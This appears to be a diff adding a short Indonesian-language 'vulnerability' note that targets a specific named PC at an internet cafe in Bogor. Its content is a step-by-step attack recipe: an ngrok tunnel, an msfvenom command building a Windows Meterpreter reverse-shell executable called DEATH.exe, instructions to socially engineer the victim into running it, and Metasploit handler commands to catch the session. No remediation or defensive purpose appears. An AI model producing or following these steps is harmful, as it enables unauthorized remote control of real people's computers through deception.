@@ -1,0 +1,33 @@
+Informasi : Keamanan
+STATUS    : TERVERIFIKASI
+LEGIT? Ya
+Tipe      : Meterpreter
+TINGKAT   : SANGAT TINGGI
+
+Tipe serangan => Metasploit
+
+Di PC Nomer 9 Di Warnet VICAZANET-3 Bogor, Tajurhalang, Tonjong, Pelita terdapat kerentanan.. 
+dimana PC Tersebut Bisa di serang dengan backdoor metasploit.
+
+Metasploit VERSION
+  msf5 exploit(multi/handler) > version
+  Framework: 5.0.99-dev
+  Console  : 5.0.99-dev
+ 
+TARGET => Windows XP
+
+Cara:
+  1. Set up port forwarding dengan Ngrok
+  2. Buka ngrok dengan mengatur set PORT ke 8080
+  3. Buka metasploit console
+  4. Membuat Virus Metasploit
+     > msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host pada ngrok> LPORT=<port di ngrok> -f exe -o DEATH.exe
+  5. Melakukan Social Engineering Pada Korban agar korban mau menginstall file DEATH.exe
+  6. Lakukan setup terlebih dahulu sebelum korban membuka file DEATH.exe
+     msf5 > use multi/handler
+     msf5 (multi/handler) > set payload windows/meterpreter/reverse_tcp
+     msf5 (multi/handler) > set LHOST localhost
+     msf5 (multi/handler) > set LPORT 8080
+     msf5 (multi/handler) > exploit
+  7. Setelah itu baru suruh korban untuk membuka atau mengeksekusi file DEATH.exe di komputer nya
+  8. setelah masuk ke meterpreter > .. maka saat itu lah PC tersebut GAME OVER
